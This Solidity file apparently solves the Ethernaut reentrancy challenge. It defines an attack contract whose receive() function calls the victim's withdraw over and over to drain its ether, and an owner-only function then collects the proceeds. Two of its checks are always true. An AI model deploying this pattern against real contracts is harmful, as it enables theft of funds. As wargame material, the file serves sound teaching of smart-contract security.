// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../ethernautContracts/10_Rentrancy.sol";

import "hardhat/console.sol";

import "@openzeppelin/contracts/access/Ownable.sol";

contract ReentrancyAttack is Ownable {

    Reentrance public victimContract;

    uint donationValue;

    constructor (address payable _victimContractAddress) payable {
        victimContract = Reentrance(_victimContractAddress);
    }

    //After the hack, we need the infrastruture to withdraw the funds:

    function withdraw() external  onlyOwner {
        console.log ("banana");

        uint256 balance = address(this).balance;

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transaction Failed");

    
    }

    function getBalance() view external returns (uint) {
        uint balance = address(this).balance;
        return (balance);

    }

    //The attack:
    //1.- attack() to start the loop
    //2.- receive() to receive the funds and relaunch the loop.
    function attack () external payable  {
        require(msg.value >= 0, "Please, donate something");
        donationValue = msg.value;
        victimContract.donate{value: msg.value}(address(this));
        victimContract.withdraw(donationValue);
    }

    receive() external payable {
        if (address(victimContract).balance >= 0) {
            victimContract.withdraw(donationValue);
        }
    }

}